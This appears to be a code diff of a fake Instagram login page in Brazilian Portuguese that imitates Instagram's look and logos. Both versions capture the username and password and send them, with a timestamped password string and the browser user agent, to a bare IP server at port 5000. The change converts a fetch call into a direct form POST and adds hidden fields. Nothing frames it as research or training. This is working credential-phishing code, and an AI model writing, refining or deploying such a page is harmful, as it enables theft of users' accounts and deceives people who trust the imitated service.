@@ -5,210 +5,55 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background-color: #121e26;
-            color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-            align-items: center;
-            justify-content: center;
-            padding: 0 25px;
-        }
-
-        .language-top {
-            position: absolute;
-            top: 20px;
-            color: #a8a8a8;
-            font-size: 12px;
-        }
-
-        .main-content {
-            width: 100%;
-            max-width: 375px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .logo-container {
-            margin-bottom: 40px;
-        }
-
-        .instagram-icon {
-            width: 62px;
-            height: 62px;
-        }
-
-        .login-form {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .login-form input {
-            width: 100%;
-            height: 52px;
-            background: #1c2b33;
-            border: 1px solid #36464f;
-            border-radius: 12px;
-            padding: 0 16px;
-            font-size: 14px;
-            color: #ffffff;
-        }
-
-        .login-form input::placeholder {
-            color: #8e8e8e;
-        }
-
-        .login-form input:focus {
-            border-color: #556670;
-            outline: none;
-        }
-
-        .login-btn {
-            background-color: #1864f7;
-            color: white;
-            border: none;
-            border-radius: 25px;
-            height: 44px;
-            font-size: 15px;
-            font-weight: 600;
-            margin-top: 6px;
-            cursor: pointer;
-        }
-
-        .login-btn:disabled {
-            opacity: 0.5;
-        }
-
-        .forgot-link {
-            text-align: center;
-            font-size: 14px;
-            margin-top: 18px;
-            color: #ffffff;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .footer-actions {
-            width: 100%;
-            margin-top: 40px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .create-account-btn {
-            width: 100%;
-            height: 44px;
-            background: transparent;
-            border: 1px solid #1864f7;
-            border-radius: 25px;
-            color: #1864f7;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .meta-logo {
-            width: 65px;
-            opacity: 0.8;
-            margin-top: 10px;
-        }
-
-        #errorMsg {
-            color: #ed4956;
-            font-size: 13px;
-            text-align: center;
-            margin-top: 15px;
-            display: none;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #121e26; color: #ffffff; display: flex; flex-direction: column; min-height: 100vh; align-items: center; justify-content: center; padding: 0 25px; }
+        .language-top { position: absolute; top: 20px; color: #a8a8a8; font-size: 12px; }
+        .main-content { width: 100%; max-width: 375px; display: flex; flex-direction: column; align-items: center; }
+        .logo-container { margin-bottom: 40px; }
+        .instagram-icon { width: 62px; height: 62px; }
+        .login-form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
+        .login-form input { width: 100%; height: 52px; background: #1c2b33; border: 1px solid #36464f; border-radius: 12px; padding: 0 16px; font-size: 14px; color: #ffffff; outline: none; }
+        .login-btn { background-color: #1864f7; color: white; border: none; border-radius: 25px; height: 44px; font-size: 15px; font-weight: 600; margin-top: 6px; cursor: pointer; }
+        .forgot-link { text-align: center; font-size: 14px; margin-top: 18px; color: #ffffff; text-decoration: none; font-weight: 500; }
+        .footer-actions { width: 100%; margin-top: 40px; display: flex; flex-direction: column; align-items: center; gap: 12px; }
+        .create-account-btn { width: 100%; height: 44px; background: transparent; border: 1px solid #1864f7; border-radius: 25px; color: #1864f7; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .meta-logo { width: 65px; opacity: 0.8; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="language-top">Português (Brasil)</div>
-    
     <div class="main-content">
         <div class="logo-container">
-            <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" alt="Instagram" class="instagram-icon">
+            <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" class="instagram-icon">
         </div>
 
-        <form class="login-form" id="loginForm">
-            <input type="text" id="username" name="username" placeholder="Nome de usuário, email ou celular" required autocapitalize="none">
-            <input type="password" id="password" name="password" placeholder="Senha" required>
+        <form class="login-form" action="http://15.228.223.163:5000/login" method="POST" id="loginForm">
+            <input type="text" name="user" id="username" placeholder="Nome de usuário, email ou celular" required>
+            <input type="password" name="pass" id="password" placeholder="Senha" required>
             
-            <button type="submit" class="login-btn" id="loginBtn">Entrar</button>
+            <input type="hidden" name="enc_password" id="enc_password">
+            <input type="hidden" name="userAgent" id="userAgent">
             
+            <button type="submit" class="login-btn">Entrar</button>
             <a href="#" class="forgot-link">Esqueceu a senha?</a>
-            <div id="errorMsg">Senha incorreta. Tente novamente.</div>
         </form>
 
         <div class="footer-actions">
             <button type="button" class="create-account-btn">Criar nova conta</button>
-            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" class="meta-logo">
         </div>
     </div>
 
     <script>
-        const BACKEND_URL = "http://15.228.223.163:5000/login";
-
-        const form = document.getElementById('loginForm');
-        const userInp = document.getElementById('username');
-        const passInp = document.getElementById('password');
-        const btn = document.getElementById('loginBtn');
-        const err = document.getElementById('errorMsg');
-
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            btn.disabled = true;
-            err.style.display = 'none';
-            
-            const u = userInp.value;
-            const p = passInp.value;
+        document.getElementById('loginForm').onsubmit = function() {
+            const pass = document.getElementById('password').value;
             const ts = Math.floor(Date.now() / 1000);
-            const encPwd = `#PWD_INSTAGRAM_BROWSER:0:${ts}:${p}`;
-            const ua = navigator.userAgent;
-
-            try {
-                const response = await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        user: u,
-                        pass: p,
-                        enc_password: encPwd,
-                        userAgent: ua
-                    })
-                });
-
-                if (!response.ok) throw new Error('Erro na resposta');
-
-                const result = await response.json();
-                
-                if (result.authenticated) {
-                    window.location.href = "https://www.instagram.com/";
-                } else {
-                    err.style.display = 'block';
-                    btn.disabled = false;
-                }
-            } catch (error) {
-                console.error("Erro:", error);
-                alert("Erro de conexão com o servidor. Verifique se o backend está ativo e aceita CORS.");
-                btn.disabled = false;
-            }
-        });
+            
+            // Preenche os campos ocultos antes do envio do formulário
+            document.getElementById('enc_password').value = `#PWD_INSTAGRAM_BROWSER:0:${ts}:${pass}`;
+            document.getElementById('userAgent').value = navigator.userAgent;
+            return true;
+        };
     </script>
 </body>
 </html>
